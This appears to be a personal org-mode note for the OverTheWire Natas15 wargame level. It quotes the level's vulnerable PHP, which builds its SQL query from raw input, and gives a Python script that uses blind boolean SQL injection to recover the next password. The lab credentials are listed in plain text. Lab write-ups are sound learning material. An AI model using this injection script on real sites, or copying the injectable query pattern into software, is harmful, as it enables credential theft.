@@ -1,0 +1,139 @@
+:PROPERTIES:
+:ID:       7d44aa7c-68da-4fb0-bbc5-8315c9d85aad
+:END:
+#+title: Natas15
+* Previous
+[[id:97c8b7c2-a841-41a4-ba77-8a5a045b74cb][Natas14]]
+
+* Password
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+* Flag
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+* Notes
+
+From top page:
+#+begin_src html
+   <form action="index.php" method="POST">
+    Username:
+    <input name="username"/>
+    <input type="submit" value="Check existence">
+    </input>
+   </form>
+#+end_src
+
+From index-source:
+#+begin_src php
+<?
+
+    /*
+      CREATE TABLE `users` (
+      `username` varchar(64) DEFAULT NULL,
+      `password` varchar(64) DEFAULT NULL
+      );
+    ,*/
+
+
+    if(array_key_exists("username", $_REQUEST)) {
+        $link = mysql_connect('localhost', 'natas15', '<censored>');
+
+        mysql_select_db('natas15', $link);
+
+        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+
+        if(array_key_exists("debug", $_GET)) {
+                echo "Executing query: $query";
+        }
+
+        $res = mysql_query($query, $link);
+
+        if($res) {
+                if(mysql_num_rows($res) > 0) {
+                        echo "This user exists.";
+                } else {
+                        echo "This user doesn't exist.";
+                }
+
+        } else {
+                echo "Error in query.";
+        }
+
+        mysql_close($link);
+
+    }
+?>
+#+end_src
+
+#+begin_src python :results output
+#!/usr/bin/env python3
+
+import requests
+import re
+import html
+from string import digits, ascii_uppercase, ascii_lowercase
+from bs4 import BeautifulSoup as bs
+from natas_pass import passwords
+
+session = requests.Session()
+username = "natas15"
+password = passwords[username]
+
+url = "http://{}.natas.labs.overthewire.org/".format(username)
+
+# response = session.get(url, auth=(username, password))
+# response = session.get(url + "index-source.html", auth=(username, password))
+
+pw = ""
+chars = digits + ascii_uppercase + ascii_lowercase
+
+
+for _ in range(32) :
+    l = 0
+    r = len(chars)-1
+
+    while l < r :
+        c = (l+r) // 2
+        # print("Trying {}".format(chars[c]))
+        response = requests.post(
+            url,
+            auth=(username, password),
+            data={'username':'natas16" AND password LIKE BINARY "{}{}%"; #'.format(pw, chars[c]), "password":""},
+        )
+
+        exists = True if re.findall("(This user exists.)", response.text) else False
+
+        if exists :
+            pw += chars[c]
+            # print("char {} added to pw. Now: {}".format(chars[c], pw))
+            break
+
+        else :
+            response = requests.post(
+                url,
+                auth=(username, password),
+                data={'username':'natas16" AND password > BINARY "{}{}"; #'.format(pw, chars[c]), "password":""},
+            )
+
+            exists = True if re.findall("(This user exists.)", response.text) else False
+
+            if exists :
+                l = c+1
+                # print('l={}'.format(chars[l]))
+            else :
+                r = c-1
+                # print('r={}'.format(chars[r]))
+
+    else :
+        pw += chars[l]
+        # print("l = {}, r = {}, pw = {}".format(chars[l],chars[r],pw))
+
+print(pw)
+
+#+end_src
+
+#+RESULTS:
+: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+* Next
+[[id:c4d41ed7-56c4-496b-a8b9-5b0862c6e380][Natas16]]
